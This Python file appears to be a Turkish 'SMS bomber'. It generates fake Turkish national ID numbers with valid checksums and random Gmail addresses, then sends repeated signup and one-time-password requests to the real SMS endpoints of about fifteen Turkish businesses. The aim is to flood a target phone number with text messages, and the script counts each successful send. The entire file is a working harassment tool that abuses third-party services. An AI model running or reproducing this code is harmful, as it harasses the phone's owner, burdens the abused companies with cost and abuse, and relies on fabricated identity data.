import requests
from random import choice, randint
from string import ascii_lowercase
from colorama import Fore, Style

class SendSms():
    adet = 0
  
    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1,9))
        for i in range(1, 9):
            rakam.append(randint(0,9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"

    # ==================== AKTİF SERVİSLER ====================

    def KahveDunyasi(self):
        try:
            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
                            json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
            if r.json().get("processStatus") == "Success":
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → KahveDunyasi{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/", 
                            data={"confirm": "true", "email": self.mail, "first_name": "x", "last_name": "y", 
                                  "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Wmf{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", 
                            json={"phone": self.phone}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Bim{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Suiste(self):
        try:
            r = requests.post("https://suiste.com/api/auth/code", 
                            data={"action": "register", "gsm": self.phone}, timeout=6)
            if r.json().get("code") == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Suiste{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", 
                            json={"msisdn": f"90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → KimGbIster{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def TiklaGelsin(self):
        try:
            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql", 
                            json={"operationName": "GENERATE_OTP", "variables": {"phone": f"+90{self.phone}"}}, timeout=6)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → TiklaGelsin{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
                            json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Naosstars{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp", 
                            data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
            if r.json().get("is_success") == True:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Hayatsu{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP", 
                            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Hizliecza{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend", 
                            json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Metro{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr/v1/otp/send", 
                            json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
            if r.json().get("responseType") == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → File{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder", 
                            json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
            if r.json().get("Success") == True:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Komagene{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech/api.php?", 
                            json={"job": "start_login", "phone": self.phone}, timeout=6)
            if r.json().get("status") == "success":
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Porty{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Uysal(self):
        try:
            r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms", 
                            json={"phone_number": self.phone}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Uysal{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False

    def Yapp(self):
        try:
            r = requests.post("https://yapp.com.tr/api/mobile/v1/register", 
                            json={"phone_number": self.phone}, timeout=6)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}GÖNDERİLDİ → Yapp{Style.RESET_ALL}")
                self.adet += 1
                return True
        except: pass
        return False
